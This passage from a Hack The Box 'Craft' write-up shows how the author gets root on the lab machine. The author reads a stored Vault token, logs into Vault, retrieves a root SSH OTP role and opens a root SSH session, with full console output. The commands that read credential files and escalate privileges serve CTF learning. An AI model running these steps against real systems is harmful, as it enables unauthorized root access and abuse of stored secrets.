+</span></span></code></pre></div><h2 id=root>root</h2><p>We start enumerating to see if we can find anything interesting in the home of gilfoyle, and we found a <code>.vault-token</code> file (vault is a tool for securely access/store secrets as tokens, passowrds, certificates, etc, to learn more about it go to <a href=https://www.vaultproject.io/>Vault project page</a>), and try to login to vault with it which goes well.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>gilfoyle@craft:~$ cat .vault-token 
+</span></span><span style=display:flex><span>f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9gilfoyle@craft:~$ vault login
+</span></span><span style=display:flex><span>Token (will be hidden): 
+</span></span><span style=display:flex><span>Success! You are now authenticated. The token information displayed below
+</span></span><span style=display:flex><span>is already stored in the token helper. You do NOT need to run &#34;vault login&#34;
+</span></span><span style=display:flex><span>again. Future Vault requests will automatically use this token.
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Key                  Value
+</span></span><span style=display:flex><span>---                  -----
+</span></span><span style=display:flex><span>token                f1783c8d-41c7-0b12-d1c1-cf2aa17ac6b9
+</span></span><span style=display:flex><span>token_accessor       1dd7b9a1-f0f1-f230-dc76-46970deb5103
+</span></span><span style=display:flex><span>token_duration       ∞
+</span></span><span style=display:flex><span>token_renewable      false
+</span></span><span style=display:flex><span>token_policies       [&#34;root&#34;]
+</span></span><span style=display:flex><span>identity_policies    []
+</span></span><span style=display:flex><span>policies             [&#34;root&#34;]
+</span></span><span style=display:flex><span>gilfoyle@craft:~$ 
+</span></span></code></pre></div><p>We go back to the repo of <code>craft-infra</code> inside the <code>vault</code> folder to see if we can find the secret stored, in it is a small script <code>secrets.sh</code> which has exactly what we need:
+<img src=https://ceso.github.io/images/htb/craft/4-gil.png class=center style=border-radius:8px>
+with this information we run vault to get the kv if the secret is indeed there:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>gilfoyle@craft:~$ vault kv get ssh/roles/root_otp
+</span></span><span style=display:flex><span>========== Data ==========
+</span></span><span style=display:flex><span>Key                  Value
+</span></span><span style=display:flex><span>---                  -----
+</span></span><span style=display:flex><span>allowed_users        n/a
+</span></span><span style=display:flex><span>cidr_list            0.0.0.0/0
+</span></span><span style=display:flex><span>default_user         root
+</span></span><span style=display:flex><span>exclude_cidr_list    n/a
+</span></span><span style=display:flex><span>key_type             otp
+</span></span><span style=display:flex><span>port                 22
+</span></span></code></pre></div><p>We know it is a ssh secret for root (that means, we can use it to establish a connection against root over ssh) with an otp key (<a href=https://en.wikipedia.org/wiki/One-time_password>One-Time Password</a>)
+We check what options vault provides to use it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>gilfoyle@craft:~$ vault
+</span></span><span style=display:flex><span>Usage: vault &lt;command&gt; [args]
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Common commands:
+</span></span><span style=display:flex><span>    read        Read data and retrieves secrets
+</span></span><span style=display:flex><span>    write       Write data, configuration, and secrets
+</span></span><span style=display:flex><span>    delete      Delete secrets and configuration
+</span></span><span style=display:flex><span>    list        List data or secrets
+</span></span><span style=display:flex><span>    login       Authenticate locally
+</span></span><span style=display:flex><span>    agent       Start a Vault agent
+</span></span><span style=display:flex><span>    server      Start a Vault server
+</span></span><span style=display:flex><span>    status      Print seal and HA status
+</span></span><span style=display:flex><span>    unwrap      Unwrap a wrapped secret
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Other commands:
+</span></span><span style=display:flex><span>    audit          Interact with audit devices
+</span></span><span style=display:flex><span>    auth           Interact with auth methods
+</span></span><span style=display:flex><span>    kv             Interact with Vault&#39;s Key-Value storage
+</span></span><span style=display:flex><span>    lease          Interact with leases
+</span></span><span style=display:flex><span>    namespace      Interact with namespaces
+</span></span><span style=display:flex><span>    operator       Perform operator-specific tasks
+</span></span><span style=display:flex><span>    path-help      Retrieve API help for paths
+</span></span><span style=display:flex><span>    plugin         Interact with Vault plugins and catalog
+</span></span><span style=display:flex><span>    policy         Interact with policies
+</span></span><span style=display:flex><span>    secrets        Interact with secrets engines
+</span></span><span style=display:flex><span>    ssh            Initiate an SSH session
+</span></span><span style=display:flex><span>    token          Interact with tokens
+</span></span><span style=display:flex><span>gilfoyle@craft:~$ vault ssh -h
+</span></span><span style=display:flex><span>Usage: vault ssh [options] username@ip [ssh options]
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  Establishes an SSH connection with the target machine.
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  This command uses one of the SSH secrets engines to authenticate and
+</span></span><span style=display:flex><span>  automatically establish an SSH connection to a host. This operation requires
+</span></span><span style=display:flex><span>  that the SSH secrets engine is mounted and configured.
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  SSH using the OTP mode (requires sshpass for full automation):
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>      $ vault ssh -mode=otp -role=my-role user@1.2.3.4
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  SSH using the CA mode:
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>      $ vault ssh -mode=ca -role=my-role user@1.2.3.4
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  SSH using CA mode with host key verification:
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>      $ vault ssh \
+</span></span><span style=display:flex><span>          -mode=ca \
+</span></span><span style=display:flex><span>          -role=my-role \
+</span></span><span style=display:flex><span>          -host-key-mount-point=host-signer \
+</span></span><span style=display:flex><span>          -host-key-hostnames=example.com \
+</span></span><span style=display:flex><span>          user@example.com
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>  For the full list of options and arguments, please see the documentation.
+</span></span></code></pre></div><p>Is clear is needed to execute something like <code>vault ssh -mode=otp -role=my-role user@1.2.3.4</code>, so we do it:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>gilfoyle@craft:~$  vault ssh -mode=otp -role=root_otp root@127.0.0.1
+</span></span><span style=display:flex><span>Vault could not locate &#34;sshpass&#34;. The OTP code for the session is displayed
+</span></span><span style=display:flex><span>below. Enter this code in the SSH password prompt. If you install sshpass,
+</span></span><span style=display:flex><span>Vault can automatically perform this step for you.
+</span></span><span style=display:flex><span>OTP for the session is: 6290d45c-541f-fb96-32c7-3e5a8aa4a256
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>.   *   ..  . *  *
+</span></span><span style=display:flex><span>*  * @()Ooc()*   o  .
+</span></span><span style=display:flex><span>  (Q@*0CG*O()  ___
+</span></span><span style=display:flex><span> |\_________/|/ _ \
+</span></span><span style=display:flex><span> |  |  |  |  | / | |
+</span></span><span style=display:flex><span> |  |  |  |  | | | |
+</span></span><span style=display:flex><span> |  |  |  |  | | | |
+</span></span><span style=display:flex><span> |  |  |  |  | | | |
+</span></span><span style=display:flex><span> |  |  |  |  | | | |
+</span></span><span style=display:flex><span> |  |  |  |  | \_| |
+</span></span><span style=display:flex><span> |  |  |  |  |\___/
+</span></span><span style=display:flex><span> |\_|__|__|_/|
+</span></span><span style=display:flex><span>  \_________/
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Password: 
+</span></span><span style=display:flex><span>Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>The programs included with the Debian GNU/Linux system are free software;
+</span></span><span style=display:flex><span>the exact distribution terms for each program are described in the
+</span></span><span style=display:flex><span>individual files in /usr/share/doc/*/copyright.
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+</span></span><span style=display:flex><span>permitted by applicable law.
+</span></span><span style=display:flex><span>Last login: Sat Jan  4 00:46:56 2020 from 127.0.0.1
+</span></span><span style=display:flex><span>root@craft:~# wc -c root.txt
+</span></span><span style=display:flex><span>33 root.txt
+</span></span><span style=display:flex><span>root@craft:~# 
+</span></span></code></pre></div><p>And we own root!!
+Again I enjoyed quite a lot doing this box a few hours it was going to be retired, and again thanks @Frundrod and <a href=https://www.hackthebox.eu/profile/103596>@Fugl</a> for pointing me in the right direction.</p><p>Thanks a lot for reading, and until the next write-up.</p></div></article></main><div class=post-nav><hr><div class=post-nav-left><a href=https://ceso.github.io/posts/2019/shutdown-r-now/>&#8612; Previous Post</a></div><div class=post-nav-right><a href=https://ceso.github.io/posts/2020/bitlab/>Next Post &#8614;</a></div></div><aside><h3>Latest Posts</h3><ul><li><a href=https://ceso.github.io/posts/2025/wehmutig.de/>Wehmütig</a></li><li><a href=https://ceso.github.io/posts/2025/zerdenken.de/>Zerdenken</a></li><li><a href=https://ceso.github.io/posts/2022/soc145ransomwaredetected/>SOC145 - Ransomware Detected</a></li></ul></aside></div><footer><hr><p id=social>Find me around the web:<br><a href=https://github.com/ceso target=_blank>GitHub</a>
+|
+<a href=https://youtube.com/c/LeandroLemos target=_blank>YouTube</a>
+|
+<a href=https://twitch.tv/0xc350 target=_blank>Twitch</a></p><p class=copyright>Copyright © 2025
+<a href=https://ceso.github.io/><strong>Ceso</strong></a>.</p><p class=builtWith>Built with
+<a href=http://www.gohugo.io/>Hugo</a> by ceso,
+using <a href=https://github.com/ceso/smigle-lagom>smigle-lagom</a> a fork of the theme
+<a href=https://github.com/joe-mccarthy/smigle-lite>smigle-lite</a>. Based on the theme
+<a href=https://gitlab.com/ian-s-mcb/smigle-hugo-theme>smigle</a>,
+which was influenced by the theme
+<a href=https://github.com/colorchestra/smol>smol</a>.</p></footer></div></body></html>
